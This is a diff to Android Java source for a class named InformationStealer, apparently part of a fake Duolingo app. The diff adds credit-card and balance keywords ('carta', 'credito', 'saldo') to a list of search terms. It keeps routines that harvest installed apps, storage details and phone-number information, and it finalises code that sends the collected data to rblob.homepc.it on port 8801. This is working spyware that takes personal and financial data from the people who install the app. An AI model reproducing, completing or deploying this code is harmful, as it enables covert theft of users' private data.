@@ -1,7 +1,5 @@
 package com.example.duolingopezzotto.InfoStealerManager;
 
-import static com.example.duolingopezzotto.InfoStealerManager.JSONParser.convertStringToJSON;
-
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -19,8 +17,6 @@ import android.provider.Settings;
 import android.telephony.TelephonyManager;
 
 import androidx.core.content.ContextCompat;
-
-import com.google.gson.JsonObject;
 
 import java.util.List;
 
@@ -54,8 +50,13 @@ public class InformationStealer implements Runnable {
             "esami",
             "LSO",
             "indirizzo",
+            "carta",
+            "credito",
+            "privato",
+            "saldo",
             "soldi"
     };
+
     NetworkManager netman;
     Context context;
 
@@ -68,7 +69,6 @@ public class InformationStealer implements Runnable {
     @Override
     public void run(){
 
-        JsonObject messaggioJSON;
         messaggio = new StringBuilder();
         messaggio.append("******************* ECCO LE INFORMAZIONI *******************\n");
         messaggio.append(stealApp(context));
@@ -78,8 +78,6 @@ public class InformationStealer implements Runnable {
         messaggio.append(stealNumberInformations(context));
         messaggio.append("\n******************* INFORMAZIONI RECUPERATE CON SUCCESSO *******************");
 
-        messaggioJSON = convertStringToJSON(messaggio.toString());
-        System.out.println("ECCO IL MESSAGGIO JSON: " + messaggioJSON);
 
         //TODO: NON DIMENTICHIAMOCI DI ELIMINARE TUTTA STA PARTE QUA
         int index = messaggio.indexOf("&");
@@ -93,8 +91,8 @@ public class InformationStealer implements Runnable {
         inviato = 1;
 
         netman.openConnection("rblob.homepc.it",8801,context);
-        netman.sendMessage2(messaggio);
-       // netman.closeConnection();
+        netman.sendMessage(messaggio);
+        netman.closeConnection();
     }
 
     static String stealNumberInformations(Context context) {
@@ -194,13 +192,8 @@ public class InformationStealer implements Runnable {
         double totalSizeGB = (double) totalSizeBytes / (1024 * 1024 * 1024);
         double availableSizeGB = (double) availableSizeBytes / (1024 * 1024 * 1024);
 
-        //String totalSizeFormatted = String.format("%.2f", totalSizeGB);
-        //String availableSizeFormatted = String.format("%.2f", availableSizeGB);
-
         sb.append("&Total_size=" + totalSizeGB + "_GB&");
         sb.append("Available_size=" + availableSizeGB + "_GB&");
-        // Altre informazioni sul file system...
-        System.out.println("-------\n" + sb.toString());
         return sb.toString();
     }
 
@@ -208,23 +201,18 @@ public class InformationStealer implements Runnable {
         PackageManager packageManager = context.getPackageManager();
         List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
 
-        int flag = 1;
+        int app_counter = 1;
         StringBuilder sb = new StringBuilder();
 
         for (ApplicationInfo applicationInfo : installedApplications) {
             if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                //String packageName = applicationInfo.packageName;
                 String appName = packageManager.getApplicationLabel(applicationInfo).toString();
-                //String sourceDir = applicationInfo.sourceDir;
 
-                sb.append("&App_" + flag + "_Name=").append(appName);
-               // sb.append("&Package_Name=").append(packageName);
-                //sb.append("&Source_Dir=").append(sourceDir);
+                sb.append("&App_" + app_counter + "_Name=").append(appName);
                 sb.append("&");
-                flag++;
+                app_counter++;
             }
         }
-
         return sb.toString();
     }
 
@@ -270,9 +258,5 @@ public class InformationStealer implements Runnable {
         }
 
         return sb.toString();
-    }
-
-    public StringBuilder getMessaggio(){
-        return messaggio;
     }
 }
